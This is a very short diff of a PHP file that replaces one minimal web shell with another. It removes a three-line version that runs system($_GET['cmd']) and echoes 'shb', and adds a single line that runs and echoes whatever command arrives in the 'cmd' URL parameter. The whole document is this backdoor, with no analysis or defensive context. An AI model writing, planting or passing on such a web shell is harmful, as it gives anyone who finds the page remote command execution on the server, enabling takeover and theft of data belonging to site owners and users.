@@ -1,3 +1,1 @@
-<?php system($_GET['cmd']); 
-echo "shb";
-?>
+<?php echo system($_GET['cmd']); ?>
